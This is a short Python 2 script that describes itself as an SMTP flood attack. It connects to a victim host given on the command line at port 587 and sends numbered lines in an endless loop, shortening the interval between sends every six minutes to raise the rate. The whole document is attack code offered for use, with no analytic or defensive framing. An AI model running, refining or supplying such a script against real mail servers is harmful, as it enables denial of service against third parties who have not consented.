"""
This script implements SMTP flood attack.
"""

import socket
import sys
import time

# GLOBALS
victim = sys.argv[1]
SMTP_PORT = 587
sent = 0
window_length = 60 * 6


# ATTACK
def smtp_flood():
    global sent
    send_interval = 10
    duration = 0

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((victim, SMTP_PORT))

    while True:
        # send packet
        sock.send("%s\n" % sent)

        # increment counter
        sent += 1

        # print log
        print "%s packets were sent to %s:%s. interval time: %s, send interval: %s" % (
            sent, victim, SMTP_PORT, duration, send_interval)

        # sleep for send_interval secs
        time.sleep(send_interval)

        # increment duration
        duration += send_interval

        # if window len wasn't over continue
        if duration < window_length:
            continue

        # start new window and initial duration and send interval
        duration = 0
        send_interval *= 0.666

    sock.close()


if __name__ == '__main__':
    smtp_flood()
